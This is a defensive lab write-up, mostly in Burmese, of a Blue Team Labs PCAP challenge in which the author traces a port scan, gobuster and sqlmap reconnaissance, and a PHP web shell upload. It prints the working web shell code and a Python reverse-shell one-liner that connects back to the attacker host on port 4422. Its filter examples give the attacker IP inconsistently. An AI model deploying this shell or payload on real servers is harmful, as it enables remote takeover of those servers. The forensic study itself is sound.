---
date: 2026-05-06
tags:
  - challenge
  - defensive
  - wireshark
---
 **Challenge**: https://blueteamlabs.online/home/challenge/network-analysis-web-shell-d4d3a2821b

> [!warning] Sandboxing Environment is RECOMMENDED.
> Challenge ထဲမှာပါတဲ့ဖိုင်က တကယ့် **Malware** အစစ်ကို Analyse လုပ်ရတတ်တာကြောင့် ကိုယ်ပိုင် VM တစ်ခုထဲမှာ အန္တရာယ်ကင်းအောင်အသုံးပြုဖို့အသိပေးအပ်ပါတယ်။

> [!quote] Scenario
> _The SOC received an alert in their SIEM for ‘Local to Local Port Scanning’ where an internal private IP began scanning another internal system. Can you investigate and determine if this activity is malicious or not? You have been provided a PCAP, investigate using any tools you wish._

# Q-1. What is the IP responsible for conducting the port scan activity?

Wireshark ပေါ်မှာဘယ် Host တွေအချင်းချင်းဘာတွေပြောနေကြလဲဆိုတာကို ကြည့်ချင်ရင် Conversation Statistics ကို _Statistics > Conversations_ ကနေဝင်ကြည့်နိုင်ပါတယ်။ အဲ့ထဲမှာ Address၊ Ports တွေရဲ့အချက်အလက်တွေကိုရှင်းရှင်းလင်းလင်း မြင်ရပါတယ်။ အခု ခဏလောက်လေ့လာကြည့်လိုက်တော့ သူက TCP Traffic များနေတာတွေရပါတယ်။

![[Pasted image 20260506171705.png]]

ပုံထဲကိုကြည့်ကြည့်လိုက်ရင် IP `10.251.96.4` ကတခြား IP `10.251.96.5` ကို 2 Packets အလိုက် Port တစ်ခုချင်းဆီကို လိုက်ပို့နေတာကိုတွေ့ရပါတယ်။ ဒါဆို IP `10.251.96.4` ဆိုတဲ့တစ်ယောက်က Port Scanning လိုက်လုပ်နေတဲ့သူဆိုတာ သိလိုက်ရပါတယ်။

# Q-2. What is the port range scanned by the suspicious host?

ခုနက Conversation Statistics ကိုဆက်ကြည့်လိုက်မယ်ဆိုရင် Port တစ်ခုချင်းဆီဆက်ဆက်ပြီး Scan လုပ်နေခဲ့တာတွေ့ရပါတယ်။ Port B ပေါ်မှာ Sort လုပ်လိုက်ရင် First port နဲ့ Last port `1-1024` ကိုမြင်နိုင်ပါတယ်။

- `10.251.96.4` begins port scanning on `10.251.96.5` from port `1`:

![[2026-05-06-174849_hyprshot.png]]

- To port `1024`:

![[Pasted image 20260506175054.png]]

# Q-3. What is the type of port scan conducted?

ကျွန်တော်တို့ဒီ Suspicious IP `10.251.96.4` က Port scan ကိုလုပ်တဲ့သူဆိုတော့ သူ့ကိုပဲ Focus ထားပြီး Search filter ပေါ်မှာ `ip.src == 10.251.96.4` ထားရင်း သူ့ packet info တွေစစ်ကြည့်လိုက်တဲ့အခါ TCP ပေါ်မှာ SYN requests တွေပို့နေတာတွေ့ရပါတယ်။

![[Pasted image 20260506183159.png]]

> TCP Connection တည်ဆောက်မှုပုံစံက Three-way Handshake ပေါ်အခြေခံထားတာမို့လို့ ပထမဆုံးပို့တဲ့ Request က SYN ဖြစ်ပါတယ်။ SYN ပို့ပြီးလို့ ACK flag ပြန်ရောက်လာတယ်ဆိုရင်တော့ ဒီ Port ဟာ Active/Open ဖြစ်နေတယ်ဆိုတဲ့ အဓိပ္ပာယ်ပါပဲ။ RST flag ဆိုရင်တော့ Closed ဖြစ်နေတဲ့သဘောပေါ့။

အခုပုံမှာ SYN packets တွေဆက်တိုက်သွားနေပုံကတော့ Suspicious IP က **TCP SYN** scan ပြုလုပ်ခဲ့တာကိုမြင်ရပါတယ်။

![[Pasted image 20260506192147.png]]

# Q-4. Two more tools were used to perform reconnaissance against open ports, what were they?

Attacker အသုံးပြုခဲ့တဲ့ reconnaissance tool နှစ်ခုကိုရှာခိုင်းတာဆိုတော့ ပထမတစ်ခုကို User Agent Strings ကနေမှ ထားခဲ့နိုင်လောက်တဲ့ Tool's signature ကိုပြန်ရှာကြည့်လို့ရနိုင်ပါတယ်။ ကျွန်တော်တို့ Search filter မှာ Attacker IP နဲ့အတူ HTTP protocol ပါဝင်တဲ့ Packets တွေကိုရှာကြည့်နိုင်ပါတယ်။

```
ip.src == 10.251.95.4 && http.user_agent
```

အောက်မှာကြည့်လိုက်မယ်ဆိုရင် Attacker က Port Scan ပြုလုပ်စဥ်အချိန်က Pattern တွေ့ရပါတယ်။

![[Pasted image 20260507192532.png]]

Packet ရဲ့ User-Agent အချက်အလက်ကိုစစ်ကြည့်မယ်ဆိုရင် ပထမနာမည်လေးတစ်ခုရှာတွေ့ပါလိမ့်မယ်။

![[Pasted image 20260507192908.png]]

နောက် Tool တစ်ခုကိုဆက်ရှာဖို့ Packet တွေလိုက်ဆွဲကြည့်လိုက်တဲ့ ထူးဆန်းရှုပ်ထွေးတဲ့ URL တစ်ခုကိုတွေ့ရပါတယ်။ SQL commands တွေရောထည့်ထားတဲ့ URL လေးပေါ့ (SQL Injection Attempt)။

![[Pasted image 20260507193326.png]]

ဒီ Packet ကိုလည်းစစ်ကြည့်လိုက်မယ်ဆိုရင် သူ့မှာလည်း User-Agent Header ပါနေတာမို့လို့ ဒုတိယမြောက် Tool name တစ်ခုတွေ့ရပါတယ်။

![[Pasted image 20260507231150.png]]

# Q-5. What is the name of the php file through which the attacker uploaded a web shell?

တစ်ယောက်ယောက်က Webpage ဆီ Information/data ပေးပို့မယ်ဆိုရင် HTTP POST request method ကိုအသုံးပြုပါတယ်။ HTTP GET ဆိုရင်တော့ Data ရယူဖို့တောင်းတာပေါ့။ Attacker ဘက်က Upload လုပ်တဲ့ဖိုင်ကိုရင်လိုက်ရှာမှာဆိုတော့ Search filter မှာအောက်ပါအတိုင်း ရိုက်ရှာနိုင်ပါတယ်။

```
ip.src == 10.251.95.4 && http.request.method == POST
```

Packet တွေအများကြီးတွေ့ထဲမှာမှ ဆက်ရှာကြည့်လိုက်ရင် `upload.php` တစ်ခုကိုတွေ့ရပါတယ်။ အသေးစိတ် Headers တွေလိုက်စစ်ကြည့်လိုက်တဲ့အခါ Referer မှာဘယ် php file ကိုအသုံးပြုပြီး attacker က web shell ပို့လိုက်တယ်ဆိုတာကို မြင်နိုင်ပါတယ်။

![[Pasted image 20260507234408.png]]

# Q-6. What is the name of the web shell that the attacker uploaded?

ခုနက Packet က suspicious ဖြစ်ဖို့ကောင်းတာသေချာပေါက်ဆိုတော့ _Follow > TCP Stream_ ထောက်ပြီးဆက်ကြည့်ခဲ့ပါတယ်။ အဲ့ဒီမှာ plain text အဖြစ်နဲ့ fileToUpload ဆိုတဲ့ `dbfunctions.php` ဆိုတာကိုတွေရပါတယ်။

![[Pasted image 20260507234650.png]]

# Q-7. What is the parameter used in the web shell for executing commands?


`dbfunction.php` အောက်က info တွေကိုဆက်ကြည့်မယ်ဆိုရင် `cmd` ဆိုတဲ့ parameter ကိုသုံးပြီး shell တည်ဆောက်ဖို့အတွက်ပါဝင်တဲ့ php code တွေကိုမြင်ရနိုင်ပါတယ်။

```php
<?php
if(isset($_REQUEST['cmd']) ){
echo "<pre>";
$cmd = ($_REQUEST['cmd']);
system($cmd);
echo "</pre>";
die;
}
?>
```

# Q-8. What is the first command executed by the attacker?

Attacker ကဖိုင်တစ်ခုကို Web shell အဖြစ်နဲ့အလုပ်လုပ်ဖို့ Upload တင်လိုက်ပြီဆိုတော့သူ့ cmd ကနေ GET request တွေဆက်တိုက်ပို့နေမယ့်ဟာကိုရှာဖို့ search filter မှာအောက်ပါအတိုင်းရှာကြည့်နိုင်ပါတယ်။

```
ip.src == 10.251.95.4 && http.request.method == GET
```

Packet တွေကိုစစ်ကြည့်လိုက်ရင် Attacker execute လုပ်ခဲ့တဲ့ command တွေကိုမြင်ရနိုင်ပါတယ်။

![[Pasted image 20260508114435.png]]

`dbfunctions.php` က server မှာသွားသိမ်းလိုက်ပြီဆိုတော့ Attacker က File URL ကနေတစ်ဆင့် Command တွေစတင် Execute လုပ်တော့ပါပဲ။ ပထမဆုံး Run ခဲ့တဲ့ command ကိုရှာချင်ရင် နံပါတ်အစဥ်လိုက် sort လုပ်ပြီးရှာနိုင်ပါတယ်။

# Q-9. What is the type of shell connection the attacker obtains through command execution?

Attacker execute လုပ်ခဲ့တဲ့ တတိမြောက် command ကိုကြည့်လိုက်မယ်ဆိုရင် Python payload တစ်ခုအသုံးပြုပြီး connection တစ်ခုဆက်တည်ဆောက်ဖို့ လုပ်ခဲ့တာကိုမြင်ရနိုင်ပါတယ်။

Payload အပြည့်အစုံကို _Follow > TCP_ မှာမြင်ရနိုင်ပါတယ်။

```http
GET /uploads/dbfunctions.php?cmd=python%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2210.251.96.4%22,4422));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/sh%22,%22-i%22]);%27 HTTP/1.1
```

Decoded payload:

```python
python -c 'import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("10.251.96.4",4422));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/sh","-i"]);'
```

ဒီ Payload ရဲ့သဘောတရားက Attacker က Server ကိုသူ့ဆီပြန်ချိတ်ခိုင်းလိုက်တာပါ၊ IP `10.251.94.4` (Attacker's IP) နဲ့ Port `4422` ဆီကိုပေါ့။ ဒါမှ Web Shell ထက်သတ်မှတ်ချက်ကိုကျော်ဖို့ Interactive access ရှိတဲ့ Reverse Shell connection ရအောင်ကြိုးစားခဲ့တာဖြစ်ပါတယ်။

# Q-10. What is the port he uses for the shell connection?

Payload မှာ Attacker ရဲ့ IP နဲ့ Port ကိုတွေ့ခဲ့ပြီးပြီဆိုတော့ Port က `4422` ပါပဲ။

---

## Conclusion

We analyzed how the attacker performed reconnaissance against the target IP's port scanning, tools like gobuster and sqlmaps used by an attacker, and the uploads of malicious files to create a reverse shell. Everything happened in a internal local network.
